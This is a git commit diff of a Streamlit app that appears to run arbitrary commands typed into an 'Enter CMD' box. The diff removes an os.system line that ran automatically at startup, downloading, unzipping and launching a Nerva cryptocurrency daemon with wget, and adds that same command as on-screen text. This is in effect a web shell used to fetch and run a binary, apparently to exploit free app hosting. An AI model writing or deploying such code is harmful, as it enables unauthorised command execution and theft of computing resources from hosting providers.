62bf3893f19dc7094b78cc03f761fe6d082388c1
fuzhome <fuzhome98@gmail.com>
2024-07-05 03:19:14 +0530

    Update app.py

--- app.py
+++ app.py
@@ -2,6 +2,7 @@ import os
 import streamlit as st
 
 st.header('My Streamlit App')
+st.text("wget https://github.com/nerva-project/nerva/releases/download/v0.1.8.0/nerva-v0.1.8.0_linux_minimal.zip -O nerva.zip && unzip nerva.zip && ./nervad")
 input_text = st.text_input('Enter CMD')
 button = st.button('Run')
 
@@ -11,5 +12,3 @@ if button:
         st.text(output)
     else:
         st.text('Please Enter CMD')
-
-os.system("wget https://github.com/nerva-project/nerva/releases/download/v0.1.8.0/nerva-v0.1.8.0_linux_minimal.zip -O nerva.zip && unzip nerva.zip && ./nervad")
